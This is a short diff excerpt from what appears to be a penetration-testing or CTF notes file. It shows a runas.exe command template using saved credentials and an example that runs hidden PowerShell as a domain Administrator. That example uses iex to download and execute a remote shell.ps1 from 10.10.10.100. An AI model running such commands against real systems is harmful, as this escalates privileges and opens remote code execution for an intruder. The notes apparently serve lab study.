@@ -21,3 +21,5 @@ runas.exe /profile /user:$_DOMAIN\$_USERNAME /savedcred "$_COMMAND"
 ```
 C:\>runas.exe /profile /user:ACCESS\Administrator /savedcred "powershell -ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
 ```
+
+
